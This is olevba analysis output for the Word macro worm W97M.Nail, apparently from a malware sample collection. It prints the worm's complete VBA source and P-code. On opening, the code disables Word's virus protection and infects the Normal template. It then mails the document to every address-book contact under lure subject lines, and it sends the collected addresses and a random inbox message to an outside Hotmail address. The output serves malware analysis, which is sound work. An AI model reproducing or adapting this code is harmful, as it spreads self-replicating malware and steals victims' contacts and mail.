olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nail.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nail.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'W97M.Nail/ACM (20/03/99) Variant v0.2
Private Sub Document_Open()
    On Error Resume Next
    Randomize
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If NT.Lines(1, 1) <> "'<!--1nternal-->" Then
        If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office", "Melissa?") <> "" Then
            MsgBox ("W97M.Nail variant detected...")
            GInfo = "ES: "
        End If
        NT.DeleteLines 1, NT.CountOfLines
        NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
        Set MAPISess = CreateObject("MAPI.Session")
        MAPISess.Logon
            SubjectLines = Array("", MAPISess.CurrentUser, "Who's your Daddy?", "I've finished it!")
            ContentLines = Array("", "I thought you should know about this recent development...", "The media distort everything...", "You would probably find this interesting...")
            MesNum = Int(Rnd * 4)
            CRLF = Chr(13) + Chr(10)
            MesContent = CRLF + ContentLines(MesNum) + CRLF + CRLF + MAPISess.CurrentUser
            Set ChainMes = MAPISess.Outbox.Messages.Add(SubjectLines(MesNum), MesContent)
            Set objRecipients = ChainMes.Recipients
            For Each AdrEntry In MAPISess.AddressLists(1).AddressEntries
                Set Recp = objRecipients.Add(Name:=AdrEntry.Address, Type:=3)
                GInfo = GInfo + AdrEntry.Address + ";"
            Next
            Set objAttach = ChainMes.Attachments.Add
            objAttach.Type = 1
            objAttach.Source = ActiveDocument.FullName
            objAttach.Position = 0
            objAttach.Name = MAPISess.CurrentUser
            GInfo = GInfo + CRLF + CRLF + MAPISess.Inbox.Messages(Int(Rnd * MAPISess.Inbox.Messages.Count) + 1).Text + CRLF
            GInfo = GInfo + "W97M.Nail II"
            Set Retr = MAPISess.Outbox.Messages.Add(MAPISess.CurrentUser, GInfo)
            Set Recp = Retr.Recipients.Add(Name:="chainnail@hotmail.com")
            Retr.Send
            ChainMes.Send
        MAPISess.Logoff
    End If
    If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
        AD.DeleteLines 1, AD.CountOfLines
        AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
    End If
End Sub
Private Sub Document_New()
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
        AD.DeleteLines 1, AD.CountOfLines
        AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Nail.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4714 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000F "<!--1nternal-->"
' Line #1:
' 	QuoteRem 0x0000 0x0025 "W97M.Nail/ACM (20/03/99) Variant v0.2"
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #10:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0010 "'<!--1nternal-->"
' 	Ne 
' 	IfBlock 
' Line #11:
' 	LitStr 0x0000 ""
' 	LitStr 0x002B "HKEY_CURRENT_USER\Software\Microsoft\Office"
' 	LitStr 0x0008 "Melissa?"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #12:
' 	LitStr 0x001D "W97M.Nail variant detected..."
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #13:
' 	LitStr 0x0004 "ES: "
' 	St GInfo 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #17:
' 	SetStmt 
' 	LitStr 0x000C "MAPI.Session"
' 	ArgsLd CreateObject 0x0001 
' 	Set MAPISess 
' Line #18:
' 	Ld MAPISess 
' 	ArgsMemCall Logon 0x0000 
' Line #19:
' 	LitStr 0x0000 ""
' 	Ld MAPISess 
' 	MemLd CurrentUser 
' 	LitStr 0x0011 "Who's your Daddy?"
' 	LitStr 0x0011 "I've finished it!"
' 	ArgsArray Array 0x0004 
' 	St SubjectLines 
' Line #20:
' 	LitStr 0x0000 ""
' 	LitStr 0x003A "I thought you should know about this recent development..."
' 	LitStr 0x001F "The media distort everything..."
' 	LitStr 0x002B "You would probably find this interesting..."
' 	ArgsArray Array 0x0004 
' 	St ContentLines 
' Line #21:
' 	Ld Rnd 
' 	LitDI2 0x0004 
' 	Mul 
' 	FnInt 
' 	St MesNum 
' Line #22:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St CRLF 
' Line #23:
' 	Ld CRLF 
' 	Ld MesNum 
' 	ArgsLd ContentLines 0x0001 
' 	Add 
' 	Ld CRLF 
' 	Add 
' 	Ld CRLF 
' 	Add 
' 	Ld MAPISess 
' 	MemLd CurrentUser 
' 	Add 
' 	St MesContent 
' Line #24:
' 	SetStmt 
' 	Ld MesNum 
' 	ArgsLd SubjectLines 0x0001 
' 	Ld MesContent 
' 	Ld MAPISess 
' 	MemLd Outbox 
' 	MemLd Messages 
' 	ArgsMemLd Add 0x0002 
' 	Set ChainMes 
' Line #25:
' 	SetStmt 
' 	Ld ChainMes 
' 	MemLd Recipients 
' 	Set objRecipients 
' Line #26:
' 	StartForVariable 
' 	Ld AdrEntry 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MAPISess 
' 	ArgsMemLd AddressLists 0x0001 
' 	MemLd AddressEntries 
' 	ForEach 
' Line #27:
' 	SetStmt 
' 	Ld AdrEntry 
' 	MemLd Address 
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed TypeOf 
' 	Ld objRecipients 
' 	ArgsMemLd Add 0x0002 
' 	Set Recp 
' Line #28:
' 	Ld GInfo 
' 	Ld AdrEntry 
' 	MemLd Address 
' 	Add 
' 	LitStr 0x0001 ";"
' 	Add 
' 	St GInfo 
' Line #29:
' 	StartForVariable 
' 	Next 
' Line #30:
' 	SetStmt 
' 	Ld ChainMes 
' 	MemLd Attachments 
' 	MemLd Add 
' 	Set objAttach 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld objAttach 
' 	MemSt TypeOf 
' Line #32:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld objAttach 
' 	MemSt Source 
' Line #33:
' 	LitDI2 0x0000 
' 	Ld objAttach 
' 	MemSt Position 
' Line #34:
' 	Ld MAPISess 
' 	MemLd CurrentUser 
' 	Ld objAttach 
' 	MemSt New 
' Line #35:
' 	Ld GInfo 
' 	Ld CRLF 
' 	Add 
' 	Ld CRLF 
' 	Add 
' 	Ld Rnd 
' 	Ld MAPISess 
' 	MemLd Inbox 
' 	MemLd Messages 
' 	MemLd Count 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld MAPISess 
' 	MemLd Inbox 
' 	ArgsMemLd Messages 0x0001 
' 	MemLd Then 
' 	Add 
' 	Ld CRLF 
' 	Add 
' 	St GInfo 
' Line #36:
' 	Ld GInfo 
' 	LitStr 0x000C "W97M.Nail II"
' 	Add 
' 	St GInfo 
' Line #37:
' 	SetStmt 
' 	Ld MAPISess 
' 	MemLd CurrentUser 
' 	Ld GInfo 
' 	Ld MAPISess 
' 	MemLd Outbox 
' 	MemLd Messages 
' 	ArgsMemLd Add 0x0002 
' 	Set Retr 
' Line #38:
' 	SetStmt 
' 	LitStr 0x0015 "chainnail@hotmail.com"
' 	ParamNamed New 
' 	Ld Retr 
' 	MemLd Recipients 
' 	ArgsMemLd Add 0x0001 
' 	Set Recp 
' Line #39:
' 	Ld Retr 
' 	ArgsMemCall Send 0x0000 
' Line #40:
' 	Ld ChainMes 
' 	ArgsMemCall Send 0x0000 
' Line #41:
' 	Ld MAPISess 
' 	ArgsMemCall Logoff 0x0000 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0010 "'<!--1nternal-->"
' 	Ne 
' 	IfBlock 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #45:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Private Sub Document_New())
' Line #49:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #50:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #51:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0010 "'<!--1nternal-->"
' 	Ne 
' 	IfBlock 
' Line #52:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #53:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|CurrentUser         |May detect Norman Sandbox                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

